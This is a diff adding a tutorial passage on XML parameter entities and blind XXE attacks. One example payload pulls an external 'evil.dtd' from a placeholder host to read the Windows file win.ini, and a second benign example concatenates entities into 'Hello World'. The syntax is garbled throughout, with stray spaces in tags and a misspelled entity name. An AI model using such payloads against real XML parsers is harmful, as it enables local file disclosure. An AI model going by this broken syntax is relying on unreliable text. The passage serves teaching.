@@ -116,4 +116,33 @@ Such as:
 <! ENTITY% entity name "entity value">
 or
 <! ENTITY% entity name SYSTEM "URI">
+```   
+Parameter entities are used in internal subsets of DTDs and documents. Unlike ordinary entities, it starts with a character (%) and ends with a character (;). Only in the DTD file may make other entities referenced when the parameter entity is declared.   
+(Blind XXE attacks often use parameter entities for data echo)   
+Example 1:   
 ```
+<! DOCTYPE foo [<! ELEMENT foo ANY> 
+<! ENTITY% xxe SYSTEM "http: //xxxx/evil.dtd">
+% xxe;]>
+<foo> & evil; </ foo>
+```   
+The contents of evil.dtd are:
+`<!ENTITY evil SYSTEM “file:///c:/windows/win.ini" >`
+
+Example 2:   
+```
+<? xml version = "1.0" encoding = "utf-8"?> 
+<! DOCTYPE root [ 
+    <! ENTITY% param1 "Hello"> 
+    <! ENTITY% param2 ""> 
+    <! ENTITY% param3 "World"> 
+    <! ENTITY dtd SYSTEM "combine.dtd">
+    % dtd;
+]>
+<root> <foo> & content </ foo> </ root>
+```   
+The content of combine.dtd is:   
+`<!ENTITY content "%parm1;%parm2;%parm3;">`   
+Explanation:   
+A basic entity is defined in combine.dtd above, which references 3 parameter entities:% param1 ;,% param2 ;,% param3 ;.    
+The parsed `<foo>…</foo>` content is Hello World.    
